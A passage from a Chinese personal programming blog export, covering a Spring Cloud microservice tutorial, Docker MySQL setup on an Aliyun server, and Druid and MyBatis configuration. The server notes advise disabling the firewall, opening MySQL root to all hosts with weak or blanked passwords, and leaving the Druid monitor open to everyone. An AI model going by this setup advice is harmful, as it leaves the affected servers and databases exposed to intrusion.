&lt;groupId&gt;com.funtl&lt;/groupId&gt; &lt;artifactId&gt;hello-spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;relativePath&gt;../hello-spring-cloud-dependencies/pom.xml&lt;/relativePath&gt; &lt;/parent&gt; &lt;artifactId&gt;hello-spring-cloud-eureka&lt;/artifactId&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;name&gt;hello-spring-cloud-eureka&lt;/name&gt; &lt;url&gt;http://www.funtl.com&lt;/url&gt; &lt;inceptionYear&gt;2018-Now&lt;/inceptionYear&gt; &lt;dependencies&gt; &lt;!-- Spring Boot Begin --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- Spring Boot End --&gt; &lt;!--eureka配置--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;mainClass&gt;com.funtl.hello.spring.cloud.eureka.EurekaApplication&lt;/mainClass&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt; &lt;version&gt;2.4.2&lt;/version&gt; &lt;configuration&gt; &lt;skipTests&gt;true&lt;/skipTests&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 配置application.yml12345678910111213141516spring: application: name: hello-spring-cloud-eurekaserver: port: 8761eureka: instance: hostname: localhost client: registerWithEureka: false fetchRegistry: false serviceUrl: defaultZone: http://$&#123;eureka.instance.hostname&#125;:$&#123;server.port&#125;/eureka/ 配置EurekaApplication1234567891011121314151617package com.funtl.hello.spring.cloud.eureka;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.netflix.eureka.server.EnableEurekaServer;@SpringBootApplication@EnableEurekaServerpublic class EurekaApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(EurekaApplication.class, args); &#125;&#125; 创建服务提供者创建Dictionary hello-spring-cloud-service-admnin 创建文件目录 如图 创建pom.xml配置文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;com.funtl&lt;/groupId&gt; &lt;artifactId&gt;hello-spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;relativePath&gt;../hello-spring-cloud-dependencies/pom.xml&lt;/relativePath&gt; &lt;/parent&gt; &lt;artifactId&gt;hello-spring-cloud-service-admin&lt;/artifactId&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;name&gt;hello-spring-cloud-service-admin&lt;/name&gt; &lt;url&gt;http://www.funtl.com&lt;/url&gt; &lt;inceptionYear&gt;2018-Now&lt;/inceptionYear&gt; &lt;dependencies&gt; &lt;!-- Spring Boot Begin --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- Spring Boot End --&gt; &lt;!-- Spring Cloud Begin --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-web&lt;/artifactId&gt; &lt;version&gt;5.0.9.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring Cloud End --&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;mainClass&gt;com.funtl.hello.spring.cloud.service.admin.ServiceAdminApplication&lt;/mainClass&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 创建application.yml配置文件1234567891011spring: application: name: hello-spring-cloud-service-adminserver: port: 8762eureka: client: serviceUrl: defaultZone: http://localhost:8761/eureka/ 配置多服务启动 原因 由于分布式的构造需求，我们不可能由一个项目来提供服务，所以可以通过不同的端口进行多服务的高并发，高可用，因此需要在idea中设置相同工程多个同时启动。 启动方法配置ServiceAdminApplication1234567891011121314package com.funtl.hello.spring.cloud.service.admin;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.netflix.eureka.EnableEurekaClient;@SpringBootApplication@EnableEurekaClientpublic class ServiceAdminApplication &#123; public static void main(String[] args)&#123; SpringApplication.run(ServiceAdminApplication.class,args); &#125;&#125; 配置AdminController12345678910111213141516171819202122package com.funtl.hello.spring.cloud.service.admin.controller;import org.springframework.beans.factory.annotation.Value;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class AdminController &#123; @Value("$&#123;server.port&#125;") private String port ; @RequestMapping(value = "hi" , method = RequestMethod.GET) public String sayHi(String message)&#123; return String.format("Hi your message is : %s port: %s",message,port); &#125;&#125; 创建服务消费者（实现熔断机制）服务消费者介绍在springcloud-netfli下是存在有两种服务消费者的分别是ribbon和feign两种，但是真正使用起来，我们常用的是feign的方式进行服务消费者的构建，feign是ｒibbon的再封装，而且feign的使用也更加简单。(博客记录仅有feign) 创建Dictionary hello-spring-cloud-web-admin-feign ### 创建目录结构 如图 配置pom.xml12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;com.funtl&lt;/groupId&gt; &lt;artifactId&gt;hello-spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;relativePath&gt;../hello-spring-cloud-dependencies/pom.xml&lt;/relativePath&gt; &lt;/parent&gt; &lt;artifactId&gt;hello-spring-cloud-web-admin-feign&lt;/artifactId&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;name&gt;hello-spring-cloud-web-admin-feign&lt;/name&gt; &lt;url&gt;http://www.funtl.com&lt;/url&gt; &lt;inceptionYear&gt;2018-Now&lt;/inceptionYear&gt; &lt;dependencies&gt; &lt;!-- Spring Boot Begin --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- Spring Boot End --&gt; &lt;!-- Spring Cloud Begin --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- Spring Cloud End --&gt; &lt;!-- 解决 thymeleaf 模板引擎一定要执行严格的 html5 格式校验问题 --&gt; &lt;dependency&gt; &lt;groupId&gt;net.sourceforge.nekohtml&lt;/groupId&gt; &lt;artifactId&gt;nekohtml&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--hystrix仪表盘--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix-dashboard&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;mainClass&gt;com.funtl.hello.spring.cloud.web.admin.feign.WebAdminFeignApplication&lt;/mainClass&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 配置application.yml12345678910111213141516171819202122232425262728spring: application: name: hello-spring-cloud-web-admin-feign thymeleaf: cache: false mode: LEGACYHTML5 encoding: UTF-8 servlet: content-type: text/html cloud: config: uri: http://localhost:8888 name: config-client label: master profile: devserver: port: 8765eureka: client: serviceUrl: defaultZone: http://localhost:8761/eureka///熔断机制开启feign: hystrix: enabled: true 配置WebAdminFeignApplication123456789101112131415161718package com.funtl.hello.spring.cloud.web.admin.feign;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.client.discovery.EnableDiscoveryClient;import org.springframework.cloud.netflix.hystrix.dashboard.EnableHystrixDashboard;import org.springframework.cloud.openfeign.EnableFeignClients;@SpringBootApplication@EnableDiscoveryClient@EnableFeignClients@EnableHystrixDashboardpublic class WebAdminFeignApplication &#123; public static void main(String[] args)&#123; SpringApplication.run(WebAdminFeignApplication.class,args); &#125;&#125; HystrixDashboardConfiguration配置123456789101112131415161718192021222324252627282930package com.funtl.hello.spring.cloud.web.admin.feign.config;import com.netflix.hystrix.contrib.metrics.eventstream.HystrixMetricsStreamServlet;import org.springframework.boot.web.servlet.ServletRegistrationBean;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import javax.servlet.Servlet;import javax.servlet.ServletRegistration;@Configurationpublic class HystrixDashboardConfiguration &#123; @Bean //注册一个servlet public ServletRegistrationBean getServlet()&#123; HystrixMetricsStreamServlet streamServlet = new HystrixMetricsStreamServlet(); ServletRegistrationBean registrationBean = new ServletRegistrationBean(streamServlet); registrationBean.setLoadOnStartup(1); //servlet 访问路径 registrationBean.addUrlMappings("/hystrix.stream"); registrationBean.setName("HystrixMetricsStreamServlet"); return registrationBean ; &#125;&#125; 配置接口 AdminService用于服务的请求1234567891011121314151617181920package com.funtl.hello.spring.cloud.web.admin.feign.service;import com.funtl.hello.spring.cloud.web.admin.feign.service.hystrix.AdminServiceHystrix;import org.springframework.cloud.openfeign.FeignClient;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RequestParam;import sun.awt.SunHints;// 利用注解配置到Eureaka服务注册与发现@FeignClient(value = "hello-spring-cloud-service-admin",fallback = AdminServiceHystrix.class)public interface AdminService &#123; @RequestMapping(value = "hi" ,method = RequestMethod.GET) String sayHi(@RequestParam(value = "message") String message);&#125; 配置AdminController1234567891011121314151617181920package com.funtl.hello.spring.cloud.web.admin.feign.controller;import com.funtl.hello.spring.cloud.web.admin.feign.service.AdminService;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class AdminController &#123; @Autowired private AdminService adminservice ; @RequestMapping(value = "hi", method = RequestMethod.GET) public String sayHi(@RequestParam String message)&#123; return adminservice.sayHi(message); &#125;&#125; 配置AdminServiceHystrix创建熔断器类并实现对应的 Feign 接口 ，用于实现ｆeign熔断接口，实现在注解 ＊ @FeignClient(value = “hello-spring-cloud-service-admin”,fallback = AdminServiceHystrix.class) 中的ｆallback＊ 123456789101112131415package com.funtl.hello.spring.cloud.web.admin.feign.service.hystrix;import com.funtl.hello.spring.cloud.web.admin.feign.service.AdminService;import org.springframework.stereotype.Component;@Componentpublic class AdminServiceHystrix implements AdminService &#123; @Override public String sayHi(String message) &#123; return String.format("hi, your message is : %s but request error",message) ; &#125;&#125; 使用路由网管统一进行管理创建Dictionary spring-cloud-eureka 创建目录结构 如图 创建pom.xml配置文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;com.funtl&lt;/groupId&gt; &lt;artifactId&gt;hello-spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;relativePath&gt;../hello-spring-cloud-dependencies/pom.xml&lt;/relativePath&gt; &lt;/parent&gt; &lt;artifactId&gt;hello-spring-cloud-zuul&lt;/artifactId&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;name&gt;hello-spring-cloud-zuul&lt;/name&gt; &lt;url&gt;http://www.funtl.com&lt;/url&gt; &lt;inceptionYear&gt;2018-Now&lt;/inceptionYear&gt; &lt;dependencies&gt; &lt;!-- Spring Boot Begin --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- Spring Boot End --&gt; &lt;!-- Spring Cloud Begin --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- Spring Cloud End --&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;mainClass&gt;com.funtl.hello.spring.cloud.zuul.ZuulApplication&lt;/mainClass&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 配置application.yml1234567891011121314151617181920spring: application: name: hello-spring-cloud-zuulserver: port: 8769eureka: client: serviceUrl: defaultZone: http://localhost:8761/eureka/zuul: routes: api-a: path: /api/a/** serviceId: hello-spring-cloud-web-admin-ribbon api-b: path: /api/b/** serviceId: hello-spring-cloud-web-admin-feign 配置ZuulApplication1234567891011121314151617package com.funtl.hello.spring.cloud.zuul;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.netflix.eureka.EnableEurekaClient;import org.springframework.cloud.netflix.zuul.EnableZuulProxy;@SpringBootApplication@EnableEurekaClient@EnableZuulProxypublic class ZuulApplication &#123; public static void main(String[] args)&#123; SpringApplication.run(ZuulApplication.class,args); &#125;&#125; 配置 WebAdminFeignFallbackProvider123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package com.funtl.hello.spring.cloud.zuul.provider;import com.fasterxml.jackson.databind.ObjectMapper;import org.springframework.cloud.netflix.zuul.filters.route.FallbackProvider;import org.springframework.http.HttpHeaders;import org.springframework.http.HttpStatus;import org.springframework.http.MediaType;import org.springframework.http.client.ClientHttpResponse;import java.io.ByteArrayInputStream;import java.io.IOException;import java.io.InputStream;import java.util.HashMap;import java.util.Map;public class WebAdminFeignFallbackProvider implements FallbackProvider &#123; @Override public String getRoute() &#123; return "hello-spring-cloud-web-admin-feign"; &#125; @Override public ClientHttpResponse fallbackResponse(String route, Throwable cause) &#123; return new ClientHttpResponse() &#123; @Override public HttpStatus getStatusCode() throws IOException &#123; return HttpStatus.OK; &#125; @Override public int getRawStatusCode() throws IOException &#123; return HttpStatus.OK.value(); &#125; @Override public String getStatusText() throws IOException &#123; return HttpStatus.OK.getReasonPhrase(); &#125; @Override public void close() &#123; &#125; @Override public InputStream getBody() throws IOException &#123; ObjectMapper objectMapper = new ObjectMapper(); Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put("status", 200); map.put("message", "无法连接，请检查您的网络"); return new ByteArrayInputStream(objectMapper.writeValueAsString(map).getBytes("UTF-8")); &#125; @Override public HttpHeaders getHeaders() &#123; HttpHeaders headers = new HttpHeaders(); // 和 getBody 中的内容编码一致 headers.setContentType(MediaType.APPLICATION_JSON_UTF8); return headers; &#125; &#125;; &#125;&#125; 总结与展望报错问题由于是自己创建项目，自己配置工程，难免会出现一些问题，我创建这套工程的时候也出现了许多的问题 无法找到主类问题 解决方案 ： 删除根目录下的 .idea重新配置整个项目工程就ＯＫ了 Eureka下载速度慢 无解，还是要下载，第一次下载好了以后，后面就容易很多了，但是最好一次下载完不要丢包 ### 展望分布式创建这个只是一个基础结构，其实还有更多的可拓展部分，java Web的学习从微服务才算是真正的开始了，但是所有的概念都是很抽象的，所以前面的基础还是很重要的，更多的是项目的实践上手，还有经验。gitlab，docker,docker-compose都是需要不断的熟悉的。]]></content>
  </entry>
  <entry>
    <title><![CDATA[阿里云踩坑记录系列-navicat连接服务器上mysql]]></title>
    <url>%2F2019%2F03%2F23%2F%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-01-navicat%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[第二次踩坑阿里云服务器是的，阿里云服务器上的mysql数据库不是随随便便就能连上的，需要配置安全组，同时docker上的mysql有点小问题，似乎就无法使用mysql 的一系列的命令了，绝望，好了踩坑实战记录。 云主机的区别 ecs 和 轻量级应用主机是有区别的！！！ 轻量级的云主机是有自带的mysql 的需要重置才可以，否则的话是自带的mysql数据库会导致3306端口的占用，而且workpress是默认的东西。需要重置更改centous系统才可以。 安全组的配置 Esc是需要配置安全组的轻量级的应用云主机是直接在防火墙部分设置就好 对于数据库的版本问题（5.7 / 8.x 版本的区别） 对于5.7的安装版本 $ docker pull mysql:5.7 //拉取镜像 $ docker run -p 3306:3306 –name mysql \-v /usr/local/docker/mysql/conf:/etc/mysql \-v /usr/local/docker/mysql/logs:/var/log/mysql \-v /usr/local/docker/mysql/data:/var/lib/mysql \-e MYSQL_ROOT_PASSWORD=123456 \-d mysql根据上面的指令就可以完成自己的mysql的镜像的绑定了 对于8.x版本的数据库就更简单了 先ps一点东西哈 默认的 $ docker pull mysql这个的默认是要的latest也就是最近的版本目前的版本是8 class=”x所以一定要注意”&gt;&lt;/这个的默认是要的latest也就是最近的版本目前的版本是8.x$ docker pull mysql$ docker run –name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql然后就欧克了 刚刚从大佬那里知道，原来centos也就是中国用，国际流行的还是uubuntu，所以朋友们，用ubuntu吧，hhh 还有了解的东西 狗东西centos7.x的版本是带有防火墙，说到防火墙这个东西有点玄学了，我目前的状态是把防火墙关闭了。所以建议哈，navicat这类工具无法连接上的，可以试试把防火墙关了 （看评论说tomcat会受到这个的影响）systemctl start firewalld //开启systemctl stop firewalld //关闭systemctl status firewalld //查看状态systemctl disable firewalld //开机关闭systemctl enable firewalld //开机启动 我们也许是时候谈谈操蛋的mysql8了发生了什么mysql8添加了全新的安全认知，这样的结果就是我们不能成功的用navicat远程连接这个东西，尼玛，就算解决了验证方法，特喵的还不给你权限，你还要自己提权，唉，不说了，踩坑目录如瞎。 更改安全加密方式 进入容器 1docker exec -it mysql bash 登陆mysql 123mysql -u root -pALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;Lzslov123!&apos;; 查看加密方式 1234use mysql;select user,plugin from user where user=&apos;root&apos;; 更改加密方式 1alter user &apos;root&apos;@&apos;localhost&apos; identified with mysql_native_password by &apos;password&apos;; 刷新 1flush privileges; 更改权限1234567891011select user,authentication_string from user;update user set authentication_string=&apos;&apos; where user=&apos;root&apos;;alter user&apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;Mysql@123&apos;; alter user&apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;Mysql@123&apos;; flush privileges;ALTER USER &apos;root&apos;@&apos;%&apos; IDENTIFIED WITH mysql_native_password BY&apos;Mysql@123&apos;;]]></content>
  </entry>
  <entry>
    <title><![CDATA[springboot2.0x中关于数据连接池Druid的连接]]></title>
    <url>%2F2019%2F03%2F23%2FspringBoot-06-%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E6%B1%A0Druid%2F</url>
    <content type="text"><![CDATA[数据连接池 什么是数据库连接池？当系统使用JDBC技术访问数据库时会创建一个connection对象，而该对象的创建过程是非常消耗资源的，并且创建对象的时间也比较长，假设系统一天有1万次的访问量，那么一天就会创建1万connection对象，这极大的浪费数据库的资源，而且可能造成数据库服务器内存溢出、宕机。为了解决上面的问题，就引入了数据库连接池（Connection pooling），它主要用来分配、管理、释放数据库的连接。数据库连接池首先会创建若干（该数量可以配置）个connection对象并将这些对象放入到池中，当系统需要使用connection对象时，数据库连接池会从池中分配一个事先创建好的connection对象给系统，当系统使用完毕或超时后，数据库连接池会将该connection对象重新放入到池中。这样就减少了创建connection对象所耗费的资源和时间，可以提高对数据库操作的性能。 主流数据库连接池1.C3p02.dbcp3.tomcat jdbc pool4.Druid （我用的） application.yml的配置参数spring: datasource: 数据源基本配置 username: root password: 123456 driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/ssm_crud type: com.alibaba.druid.pool.DruidDataSource 数据源其他配置 初始化参数 initialSize: 5 minIdle: 5 maxActive: 20 maxWait: 60000 timeBetweenEvictionRunsMillis: 60000 minEvictableIdleTimeMillis: 300000 validationQuery: SELECT 1 FROM DUAL testWhileIdle: true testOnBorrow: false testOnReturn: false poolPreparedStatements: true 配置监控统计拦截的filters，去掉后监控界面sql无法统计，’wall’用于防火墙 filters: stat,wall,log4j maxPoolPreparedStatementPerConnectionSize: 20 useGlobalDataSourceStat: true connectionProperties: druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500 配置config类由于数据连接池中的属性默认是tomcat的数据连接池，但是使用Druid需要配置其servlet以及filter 配置-01-DataSource— java @ConfigurationProperties(prefix = “spring.datasource”) //前缀：自定义数据源 @Bean //自定义一个数据源 public DataSource druid(){ return new DruidDataSource() ; } 配置-02-Servlet— java @Bean public ServletRegistrationBean statViewServlet(){ ServletRegistrationBean bean = new ServletRegistrationBean(new StatViewServlet(),”/druid/*”); Map&lt;String,String&gt; initParams = new HashMap&lt;&gt;(); initParams.put(&quot;loginUsername&quot;, &quot;admin&quot;) ; initParams.put(&quot;loginPassword&quot;, &quot;123456&quot;) ; initParams.put(&quot;allow&quot;, &quot;&quot;); //默认允许所有的访问 bean.setInitParameters(initParams); return bean ; } 配置-03-filter @Bean public FilterRegistrationBean webStatFilter(){ FilterRegistrationBean bean = new FilterRegistrationBean() ; Map&lt;String,String&gt; initParams = new HashMap&lt;&gt;() ; bean.setFilter(new WebStatFilter()); //不去拦截的文件 initParams.put(&quot;exclusions&quot;, &quot;*.js,*.css,/druid/*&quot;) ; bean.setInitParameters(initParams); bean.setUrlPatterns(Arrays.asList(&quot;/*&quot;)); return bean ; } 注意事项务必注意@Bean的配置，必须填入到AOP容器中，才会生效配置 在写配置类时候务必需要 @Configeration]]></content>
  </entry>
  <entry>
    <title><![CDATA[springboot整合Mybatis]]></title>
    <url>%2F2019%2F03%2F23%2FSpringBoot-07-Mybatis%E6%95%B4%E5%90%88%EF%BC%88%E6%B3%A8%E8%A7%A3)%2F</url>
    <content type="text"><![CDATA[Mybatis框架介绍 Mybatis是目前主流的轻量级框架，与之前的Hibernate相比，mybatis更加的灵活方便，并且Mybatis自身优化了starter来与springboot相适应Mybatis支持两种书写风格，xml配置和注解两种，很多大公司依然使用的是xml，但是按照springboot的推荐，注解版更简单，更受青睐（本节仍然使用druid连接池，配置文件依然使用yaml） maven依赖介绍12345678910111213141516171819202122232425262728&lt;!--JDBC的配置--&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-jdbc --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;5.1.3.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!--数据库连接池 Druid--&gt; &lt;!-- https://mvnrepository.com/artifact/com.alibaba/druid --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; 以上的三个依赖是之前我们配置druid的时候就已经搞定的依赖，下面这个mybatis依赖，注意看 123456&lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt;&lt;/dependency&gt; mybatis的依赖并不是由springboot官方写好的starter而是自身去适应springboot而开发的starter 配置文件 .yml同样的，这里接着druid的配置就欧克了 1234567891011121314151617181920spring: datasource: username: root password: 123456 url: jdbc:mysql://47.106.103.49/SCS driver-class-name: com.mysql.jdbc.Driver type: com.alibaba.druid.pool.DruidDataSourceinitialSize: 5minIdle: 5maxActive: 20maxWait: 60000timeBetweenEvictionRunsMillis: 60000minEvictableIdleTimeMillis: 300000validationQuery: SELECT 1 FROM DUALtestWhileIdle: truetestOnBorrow: falsetestOnReturn: falsepoolPreparedStatements: true configuration配置123456789101112131415161718192021222324252627282930public DataSource DruidDataSource()&#123; return new DruidDataSource(); &#125; @Bean public ServletRegistrationBean statViewServlet()&#123; ServletRegistrationBean bean = new ServletRegistrationBean(new StatViewServlet(),"/druid/*"); Map&lt;String,String&gt; initParams = new HashMap&lt;&gt;(); initParams.put("loginUsername", "admin") ; initParams.put("loginPassword", "scsscs") ; initParams.put("allow", ""); //默认允许所有的访问 bean.setInitParameters(initParams); return bean ; &#125; @Bean public FilterRegistrationBean webStatFilter()&#123; FilterRegistrationBean bean = new FilterRegistrationBean() ; Map&lt;String,String&gt; initParams = new HashMap&lt;&gt;() ; 